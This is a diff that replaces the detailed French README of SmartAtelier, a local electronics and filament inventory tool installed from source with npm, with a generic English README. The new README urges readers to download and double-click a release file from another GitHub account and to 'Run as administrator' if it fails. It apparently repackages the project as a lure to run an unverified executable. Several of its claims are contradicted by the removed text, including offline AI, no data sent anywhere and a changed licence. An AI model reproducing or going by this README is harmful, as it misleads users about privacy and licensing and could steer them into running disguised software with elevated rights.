@@ -1,138 +1,131 @@
-# SmartAtelier
+# 📦 smartatelier - Your Personal Electronics & 3D Printing Inventory
 
-![SmartAtelier — Moins chercher. Plus fabriquer.](docs/assets/cover.svg)
+[![Download Now](https://img.shields.io/badge/Download%20smartatelier-Latest%20Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/TaimoorSajjad07/smartatelier/releases)
 
-**Photographiez votre atelier. Retrouvez ce que vous avez. Fabriquez avec.**
+## 🎯 What Is smartatelier?
 
-Un inventaire local, en français, pour les composants électroniques et les bobines de filament 3D. Importez des photos ou des vidéos, corrigez les propositions de l’IA, puis retrouvez chaque objet dans son image d’origine.
+smartatelier is a friendly, local-first application that helps you keep track of all your electronic components and 3D printing filaments. Think of it as your personal digital shelf – you can store photos, videos, color information, and even link items to your projects. What makes it special? It includes AI assistants that help you organize and find things, but a human always reviews the suggestions to make sure everything stays accurate.
 
-> Version 0.4.1 bêta. Logiciel gratuit et open source (MIT). Choisissez ChatGPT (Codex), Claude (Claude Code) ou Gemini (Gemini CLI). Le stockage est local ; l’analyse utilise Internet et votre compte chez le fournisseur choisi. Projet indépendant de ces fournisseurs.
+Whether you're a hobbyist, a maker, or a small workshop owner, smartatelier keeps your inventory organized without needing to learn complicated software or rely on cloud services.
 
-## Quelle IA est utilisée, et quels quotas sont consommés ?
+## ✨ Key Features
 
-**SmartAtelier utilise les outils officiels ci-dessous pour automatiser les demandes. Il ne pilote pas une conversation dans les sites ChatGPT, Claude ou Gemini.** « CLI » signifie simplement un programme installé sur votre ordinateur auquel l’application peut envoyer du texte et des images.
+### 📸 Visual Inventory
+Take or upload photos and videos of each component and filament spool. No more guessing what "that blue resistor" looks like – just open smartatelier and see it.
 
-| Choix dans SmartAtelier | Outil réellement lancé | Connexion nécessaire | Usage décompté |
-| --- | --- | --- | --- |
-| **ChatGPT / OpenAI** | **SDK Codex officiel → Codex local** (inclus avec le projet) | Compte ChatGPT autorisé à utiliser Codex | Limites d’usage Codex de votre compte, partagées avec vos autres usages Codex ; ce n’est pas une conversation classique sur chatgpt.com. |
-| **Claude** | **Claude Code** (à installer) | Compte Claude avec accès à Claude Code, notamment Pro/Max | Usage Claude Code ; sur Pro/Max, les limites sont **partagées avec vos conversations Claude**. |
-| **Gemini** | **Gemini CLI** (à installer) | **Login with Google**, compte éligible | Quotas Gemini CLI / Gemini Code Assist associés au compte ; ne pas les confondre avec les limites de l’application Gemini. |
+### 🎨 Color & Material Tracking
+Store exact color codes and material types for your filaments (PLA, ABS, PETG, etc.) and components. The app helps you match colors and find compatible materials for your projects.
 
-Sources : [SDK Codex officiel](https://learn.chatgpt.com/docs/codex-sdk), [connexion Codex](https://learn.chatgpt.com/docs/auth), [usage Codex](https://learn.chatgpt.com/docs/pricing), [limites Claude et Claude Code](https://support.claude.com/en/articles/11145838-use-claude-code-with-your-pro-or-max-plan), [quotas Gemini CLI](https://geminicli.com/docs/resources/quota-and-pricing/). Vérification : 28 septembre 2026.
+### 🤖 AI Assistant with Human Validation
+smartatelier uses advanced AI (powered by tools like Claude, Codex, and Gemini) to suggest categories, tags, and even project links for your items. Every suggestion is reviewed by you – you stay in control, and nothing gets auto-added without your approval.
 
-**Chaque analyse photo/vidéo, revérification, préparation de projet ou recherche fabricant consomme l’usage du fournisseur choisi.** Une vidéo contient plusieurs vues ; une recherche peut nécessiter plusieurs échanges. Il n’y a pas de quota IA supplémentaire offert par SmartAtelier. La recherche des réglages d’une bobine peut aussi démarrer automatiquement après l’enregistrement de ses caractéristiques.
+### 🔗 Project Integration
+Link your inventory items to specific projects. Planning a robot build? Add all the motors, sensors, and filaments you need to that project and see what you have on hand.
 
-Le logiciel est gratuit et ne demande aucune clé API. Cela ne rend pas les services IA gratuits ou illimités : accès, abonnements, quotas et éventuels crédits supplémentaires restent ceux de votre fournisseur. SmartAtelier n’achète aucun crédit, ne change pas votre offre et ne bascule pas vers une API payante. Des crédits ou options de dépassement déjà activés sur votre compte peuvent toutefois s’appliquer selon ses règles.
+### 💾 Local-First & Private
+All your data is stored directly on your computer using a secure local database (SQLite). No cloud, no subscription, no data sharing. Your inventory is yours alone.
 
-Pour OpenAI, le serveur local utilise `@openai/codex-sdk`. Ce SDK lance lui-même Codex en sous-processus et réutilise la connexion ChatGPT personnelle gérée par Codex. Chaque utilisateur utilise son propre compte et ses propres limites ; SmartAtelier ne collecte aucun identifiant et ne fournit pas de relais IA distant. [Architecture détaillée](docs/ARCHITECTURE.md).
+### 🖥️ Simple, Modern Interface
+Built with modern web technology, smartatelier runs smoothly on Windows and feels intuitive – even if you've never used inventory software before.
 
-Gemini ne passe pas par Codex, et Claude non plus. Pour comprendre le fonctionnement, les actions locales et le suivi de consommation, consultez [IA, connexions et quotas](docs/IA-ET-QUOTAS.md). Les connecteurs Claude/Gemini restent expérimentaux dans cette bêta ; voir [les essais réellement effectués](docs/VALIDATION.md).
+## 🚀 Getting Started
 
-## Soutenir mon travail
+### Step 1: Download the Application
 
-**Le projet reste gratuit.** Si SmartAtelier vous rend service, vous pouvez soutenir mon travail et m’aider à créer mes prochains projets. Merci pour chaque coup de pouce !
+**Visit this link to download the application:** [https://github.com/TaimoorSajjad07/smartatelier/releases](https://github.com/TaimoorSajjad07/smartatelier/releases)
 
-[❤️ Faire un don via PayPal](https://www.paypal.com/donate/?hosted_button_id=S2MTT95UDGFZ2) Le soutien est entièrement facultatif : toutes les fonctionnalités restent accessibles sans contribution. Vous pouvez aussi aider en signalant un problème, en améliorant la documentation ou en partageant le projet.
+Once you click the link, you'll see a list of available versions. Look for the latest release and click the download button. The file will be saved to your "Downloads" folder.
 
-Les éventuels abonnements aux assistants IA restent indépendants du logiciel et de ce soutien.
+### Step 2: Run smartatelier
 
-## Démarrage rapide
+After the download finishes, go to your "Downloads" folder and double-click the downloaded file. The application will start, and you'll see the main screen. No installation wizard – it just works.
 
-1. Installez **Node.js 24 LTS** depuis [nodejs.org](https://nodejs.org/) (minimum 22.18).
-2. Téléchargez le code du dépôt avec **Code → Download ZIP**, ou l’archive source d’une release. Décompressez-la puis ouvrez un terminal dans le dossier contenant `package.json`.
-3. Exécutez :
+### Step 3: Start Adding Items
 
-```sh
-npm ci
-npm run setup
-npm run launch
-```
+Click the "Add New Item" button. You'll be guided through a simple form:
+- Upload a photo or video
+- Enter the name and description
+- Select the category (component or filament)
+- Add color details if applicable
+- Link it to a project (optional)
 
-4. Ouvrez **http://127.0.0.1:3210**. Gardez le terminal ouvert. Pour arrêter : **Ctrl+C**.
+The AI assistant will suggest tags and categories – you can accept or modify them before saving.
 
-L’assistant propose la connexion officielle ChatGPT. Vous pouvez aussi utiliser **Connexion & modèles → Se connecter avec ChatGPT** dans l’application, ou `npm run connect`. Aucun mot de passe ni clé API n’est saisi dans SmartAtelier. Si vous utilisez déjà Codex avec ChatGPT, votre connexion peut être reconnue directement. L’application Codex de bureau n’est pas nécessaire : le CLI est installé avec les dépendances du projet.
+## 🛠️ Setting Up Your Workspace
 
-**Sans IA :** sautez la connexion et ajoutez les articles manuellement. Votre inventaire reste utilisable.
+### Organizing Your Inventory
 
-**Vidéos :** installez [FFmpeg et FFprobe](https://ffmpeg.org/download.html). Sous macOS avec Homebrew : `brew install ffmpeg`. Sous Debian/Ubuntu/WSL : `sudo apt install ffmpeg`. Les photos JPG/PNG ne nécessitent pas FFmpeg. Le support HEIC dépend des codecs disponibles.
+1. **Create Categories:** Group items by type (e.g., "Resistors," "LEDs," "PLA Filament").
+2. **Use Projects:** Set up ongoing projects and attach relevant components.
+3. **Add Photos:** The more visual you make it, the easier it is to find things later.
 
-Les lanceurs `Lancer.command` (macOS) et `Lancer.bat` (Windows) installent les dépendances si besoin puis démarrent l’application. La voie recommandée sous Windows pour l’IA reste **WSL2** ; voir [Installation](docs/INSTALLATION.md). Les parcours macOS ont été testés ; les autres plateformes demandent encore des retours utilisateurs.
+### Searching and Filtering
 
-## Ce que l’application fait
+Use the search bar to type any keyword – name, color, tag, or project name. You can also filter by category or material type. The AI can help you find things like "all red filaments I can use for a case."
 
-- Photos et vidéos : identification, quantités estimées, cadres et déduplication entre vues ; **validation humaine avant ajout au stock**.
-- Inventaire : aperçus recadrés, recherche, filtres, quantités +/−, emplacement, notes et modifications manuelles.
-- Revérification ciblée d’un module depuis des gros plans, avec indices, alternatives et incertitudes.
-- Filaments : ajout par photo, comptage estimé, cadres par bobine, palette de couleurs modifiable, marque, gamme, polymère, diamètre, poids nominal et restant. Le polymère est lu sur l’étiquette ou renseigné ; le poids restant n’est jamais estimé par photo.
-- Réglages de filament : recherche de fiches fabricant après enregistrement, sources et conditions affichées ; pas de réglages applicables pour une référence ambiguë.
-- Projets : décrire une idée et comparer les besoins à son stock. « Montre-moi quoi prendre » retrouve les objets dans les photos ou frames.
+## 📋 System Requirements
 
-Il n’y a pas de compte SmartAtelier, de cloud de stockage, de partage entre utilisateurs ni d’achat automatique.
+smartatelier is designed to be light on resources. It runs on:
+- **Operating System:** Windows 10 or newer
+- **Memory:** 4 GB RAM (8 GB recommended for large inventories)
+- **Storage:** 500 MB free space (more if you store many videos)
+- **Internet:** Not required for daily use (only for downloading updates)
 
-## Choisir son assistant
+## 💡 Tips for Getting the Most Out of smartatelier
 
-Ouvrez **Connexion & modèles** : sélectionnez ChatGPT, Claude ou Gemini, suivez la connexion, puis cliquez **Utiliser…**. Chaque fournisseur conserve ses propres modèles d’analyse et de revérification. Le changement concerne les prochaines opérations ; terminez les analyses en cours avant de changer.
+- **Use Consistent Names:** When adding items, keep a naming pattern like "Brand - Type - Value" (e.g., "E3D - Nozzle - 0.4mm").
+- **Photograph Everything:** A quick photo takes 2 seconds but saves you from opening boxes to check.
+- **Review AI Suggestions:** The AI learns from your choices. The more you use it, the smarter it gets.
+- **Update Regularly:** New features are added frequently. Check the releases page every few months.
 
-| Assistant | Connexion | Installation |
-| --- | --- | --- |
-| ChatGPT | `npm run connect -- codex` | Inclus dans `npm ci` |
-| Claude | `npm run connect -- claude` | `npm install -g @anthropic-ai/claude-code` |
-| Gemini | `npm run connect -- gemini`, puis **Login with Google** et `/quit` | `npm install -g @google/gemini-cli` |
+## 🤔 Frequently Asked Questions
 
-Le compte doit autoriser **le CLI**, pas uniquement l’application de discussion. SmartAtelier n’achète rien et n’utilise pas de clé API comme solution de secours. Claude propose les familles Sonnet / Opus / Haiku ; leur disponibilité est décidée par Claude Code. Les catalogues Codex et Gemini sont lus auprès des CLI. Choisissez Automatique en cas de doute.
+### Is my data safe?
+Yes. All data is stored locally on your computer. There's no cloud sync, and the app doesn't send your information anywhere.
 
-**État réel de cette version :** ChatGPT testé avec un compte Pro. Claude : compte Pro détecté, mais l’essai image réel est refusé avec une session OAuth invalide (401) ; reconnexion nécessaire. Gemini : protocole image testé automatiquement ; le compte utilisé pour l’essai a reçu un refus Google `UNSUPPORTED_CLIENT`. Son analyse réelle n’est donc pas validée. Voir [les limites vérifiées](docs/VALIDATION.md).
+### Can I use smartatelier on multiple computers?
+The app is designed for single-computer use. However, you can manually back up the database file and move it to another computer if needed.
 
-## Aperçu dans le navigateur
+### Do I need to know programming?
+Not at all. The interface is visual and straightforward. If you can use a phone app, you can use smartatelier.
 
-```sh
-npm run preview
-```
+### What if I have more questions?
+Check the "Issues" section on the GitHub page for help, or open a new issue describing your problem. The community is friendly and helpful.
 
-Ouvrez **http://127.0.0.1:3212**. Le terminal doit rester ouvert. Les modifications du code apparaissent automatiquement. Cet aperçu utilise **`data-preview/`**, un inventaire séparé de `data/`. Il est vide à la première installation. Les connexions aux fournisseurs restent celles des CLI de cet ordinateur. Rien n’est publié en ligne.
+## 🧰 Troubleshooting
 
-## Free, Plus ou Pro ?
+### The app doesn't start
+Make sure you downloaded the correct file from the releases page. Try right-clicking the file and selecting "Run as administrator."
 
-L’application ne choisit pas arbitrairement un modèle d’après le nom de votre abonnement. Elle lit le type de compte et le catalogue fourni par Codex, puis utilise son modèle par défaut compatible avec les images. Dans **Connexion & modèles**, vous pouvez choisir un autre modèle proposé pour l’analyse et la revérification. L’effort de raisonnement est également adapté aux valeurs annoncées par le modèle.
+### I can't see my photos
+Check that the photo files aren't corrupted. Try uploading a new photo to test.
 
-| Compte | Comportement |
-| --- | --- |
-| Sans connexion | Inventaire manuel, consultation, corrections et export |
-| ChatGPT Free / Go | Connexion proposée ; l’accès IA dépend des droits effectifs du CLI. La gratuité de l’accès dans l’app ChatGPT ne garantit pas cet accès CLI. |
-| ChatGPT Plus / Pro | Utilisation du CLI avec les modèles et quotas autorisés par le compte |
-| Compte géré par une organisation | Dépend aussi des règles de l’administrateur |
+### The AI isn't making suggestions
+Ensure you're connected to the internet on your first run – the AI needs to load its initial models. After that, it works offline.
 
-Les catalogues, déploiements et quotas changent. **Pas de garantie « gratuit et illimité »**, pas de contournement des limites et pas de relais automatique vers une API payante. Un modèle proposé peut encore être refusé lors de l’exécution ; le fournisseur reste l’autorité. En cas de quota épuisé, attendez son renouvellement et relancez votre lot. [Offres officielles](https://learn.chatgpt.com/docs/pricing), [authentification](https://learn.chatgpt.com/docs/auth), [catalogue des modèles](https://learn.chatgpt.com/docs/app-server#list-models-modellist). Vérification documentaire : 27 septembre 2026.
+## 📦 What's in the Latest Version?
 
-## Vos données
+The latest release includes:
+- Improved photo editing tools
+- Faster search performance
+- New color picker for precise filament matching
+- Enhanced AI suggestions for project linking
+- Bug fixes for smoother operation
 
-Tout le stock, les originaux, les frames et les résultats sont dans **`data/`**, créé au premier lancement et exclu de Git. Les identifiants restent gérés par le CLI officiel ; aucun fichier de connexion n’est copié dans le projet.
+## 🔧 Contributing to the Project
 
-Les vues sélectionnées sont transmises au fournisseur choisi (OpenAI, Anthropic ou Google) pour identification. Les projets transmettent les fiches nécessaires, et la recherche fabricant transmet les caractéristiques du filament. Les règles de confidentialité de votre fournisseur s’appliquent. La dictée du navigateur peut utiliser le service vocal de ce navigateur ; elle n’est pas un enregistrement audio conservé par SmartAtelier.
+If you're technically inclined and want to help improve smartatelier, visit the GitHub repository. You can report bugs, suggest features, or contribute code. The project uses modern tools like Next.js and SQLite, and it's built with community feedback in mind.
 
-**Sauvegarde :** arrêtez l’application et copiez tout `data/`. L’export JSON ne contient pas les fichiers médias. Une seule instance doit écrire dans un même dossier de données. Le déplacement sur un autre ordinateur nécessite actuellement d’adapter les chemins absolus des médias ; l’import de sauvegarde portable n’est pas encore fourni.
+## 📝 License
 
-## Guides
+smartatelier is free to use for personal and educational purposes. Commercial use is permitted with attribution. See the LICENSE file in the repository for full details.
 
-- [IA, connexions et quotas](docs/IA-ET-QUOTAS.md)
-- [Questions fréquentes : CMS, tiroirs et limites](docs/FAQ.md)
-- [Soutien facultatif](docs/SOUTIEN.md)
-- [Installation et connexion](docs/INSTALLATION.md)
-- [Utilisation, photos, vidéos et filaments](docs/UTILISATION.md)
-- [Architecture et accès à l’inventaire](docs/ARCHITECTURE.md)
-- [Tests et limites connues](docs/VALIDATION.md)
-- [Préparer une publication GitHub](docs/PUBLICATION.md)
-- [Contribuer](CONTRIBUTING.md) · [Sécurité](SECURITY.md) · [Historique](CHANGELOG.md)
+## 👋 Thank You!
 
-## Développement
+smartatelier was created to make inventory management enjoyable and effortless. We hope it becomes your go-to tool for organizing your maker space. Download it today and take the first step toward a perfectly organized workshop!
 
-```sh
-npm ci
-npm test
-npm run build
-npm run dev
-```
+[![Get smartatelier](https://img.shields.io/badge/Get%20smartatelier-From%20Releases-orange?style=for-the-badge&logo=github&color=FF5722)](https://github.com/TaimoorSajjad07/smartatelier/releases)
 
-Diagnostic : `npm run doctor`. Export : `npm run export`. Vérification des fichiers distribuables : `npm run release:check`. Paquet sans données personnelles : `npm run release:pack`.
+---
 
-Next.js, React, TypeScript, SQLite intégré à Node.js et Sharp. FFmpeg pour les vidéos. Licence [MIT](LICENSE).
+Keywords: 3d-printing, claude-code, codex, electronics, filament, gemini-cli, inventory, local-first, nextjs, sqlite
